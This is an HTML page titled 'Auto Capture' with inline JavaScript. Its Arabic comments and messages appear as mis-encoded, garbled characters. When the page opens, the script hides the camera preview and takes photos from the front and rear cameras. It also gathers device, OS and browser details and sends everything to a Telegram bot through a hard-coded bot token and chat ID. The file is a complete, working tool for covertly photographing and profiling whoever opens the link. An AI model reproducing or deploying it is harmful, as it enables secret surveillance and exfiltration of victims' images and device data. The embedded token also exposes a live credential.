<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Capture</title>
<style>
  /* Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªÙ…Ø§Ù…Ù‹Ø§ */
  video {
    display: none !important;
    visibility: hidden;
    width: 0;
    height: 0;
  }
  body {
    font-family: sans-serif;
    text-align: center;
    padding-top: 60px;
  }
  #status {
    font-size: 18px;
    color: #333;
  }
</style>
</head>
<body>

<p id="status">ğŸ“¸ Ø¬Ø§Ø±Ù ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...</p>
<video id="video" autoplay playsinline></video>

<script>
const BOT_TOKEN = "8450043937:AAE_hkeN74kPtUBj0TcJZuIdF95QvMHSh88" 
const CHAT_ID = "5822244138";      

const video = document.getElementById('video');
const statusText = document.getElementById('status');

// Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
async function takePhoto(facingMode = "user") {
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
  video.srcObject = stream;

  await new Promise(r => video.onloadedmetadata = r);

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0);

  // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·
  stream.getTracks().forEach(t => t.stop());

  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
  return blob;
}

// Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
async function sendToTelegram(photoBlob, caption = "") {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("caption", caption);
  formData.append("photo", photoBlob, "photo.jpg");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

// Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let deviceType = /mobile/i.test(ua) ? "ğŸ“± Ù‡Ø§ØªÙ" : "ğŸ’» Ø­Ø§Ø³ÙˆØ¨";
  let os = "Ù†Ø¸Ø§Ù… ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

  if (/android/i.test(ua)) os = "Android";
  else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
  else if (/windows/i.test(ua)) os = "Windows";
  else if (/mac/i.test(ua)) os = "MacOS";
  else if (/linux/i.test(ua)) os = "Linux";

  const browserMatch = ua.match(/(firefox|chrome|safari|edge|opera)/i);
  const browser = browserMatch ? browserMatch[0] : "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

  const time = new Date().toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });

  return `ğŸ§­ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:
${deviceType}
ğŸ–¥ï¸ Ø§Ù„Ù†Ø¸Ø§Ù…: ${os}
ğŸŒ Ø§Ù„Ù…ØªØµÙØ­: ${browser}
ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${time}`;
}

// ØªØ´ØºÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù†Ø¯ ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹
window.onload = async () => {
  try {
    statusText.textContent = "ğŸ“· Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©...";
    const front = await takePhoto("user");

    statusText.textContent = "ğŸ“· Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø®Ù„ÙÙŠØ©...";
    const back = await takePhoto("environment");

    const info = getDeviceInfo();

    statusText.textContent = "ğŸ“¨ Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…...";

    await sendToTelegram(front, `Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©\n\n${info}`);
    await sendToTelegram(back, "ğŸ“· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø®Ù„ÙÙŠØ©");

    statusText.textContent = "âœ… ØªÙ… Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­!";
  } catch (err) {
    console.error(err);
    statusText.textContent = "âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø£Ùˆ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„.";
  }
};
</script>

</body>
</html>
